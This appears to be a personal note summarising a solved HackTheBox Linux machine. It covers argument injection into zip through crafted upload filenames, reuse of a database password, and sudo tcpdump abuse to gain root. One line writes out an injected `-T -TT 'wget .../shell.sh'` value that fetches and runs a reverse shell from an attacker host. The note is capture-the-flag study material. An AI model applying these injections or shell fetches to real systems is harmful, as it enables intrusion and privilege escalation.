---
type: machine
title: Dump
platform: htb
os: linux
difficulty: hard
tags: [linux, web, command-injection, sudo, wildcard-injection]
solved: 2026-07-09
sources: [[htb-dump]]
related: []
---
# Dump
> Linux box with a packet capture website that allows PCAP uploads and downloads all captures as a zip archive. Exploit wildcard injection in the zip command with crafted filenames to achieve RCE, then pivot using database credentials and abuse sudo tcpdump privileges for root.

## Attack path
1. [[wildcard-injection]] — Abuse zip command with crafted filenames (e.g., `-T`, `-TT`) for RCE
2. [[password-reuse]] — Extract password from SQLite database for user pivot
3. [[sudo-abuse]] — Abuse tcpdump sudo permissions to write arbitrary files and read root flag

## Techniques used
- [[wildcard-injection]] — Filename injection into zip command using `-T -TT` flag combination for command execution
- [[command-injection]] — Remote code execution via zip -TT flag to fetch and execute shell from attacker server
- [[password-reuse]] — Database credential reuse between www-data web account and fritz user
- [[sudo-abuse]] — Abuse tcpdump sudo permissions with `-w`, `-Z`, `-r`, `-V` flags for file write/read as root

## Tools used
[[nmap]], [[feroxbuster]], [[ffuf]], [[curl]], [[nc]], tcpdump

## Services / ports
[[ssh]] (22), [[http]] (80)

## Lessons / notes
- Parameter injection identified by uploading `--help` filename, showed zip help output
- Used `-T -TT 'wget 10.10.14.17/shell.sh'` to fetch and execute reverse shell via zip command
- Multiple tcpdump abuse vectors: write files as root/user, read arbitrary files with `-V`, write sudoers file
- AppArmor profile restricted tcpdump but didn't prevent all exploitation paths
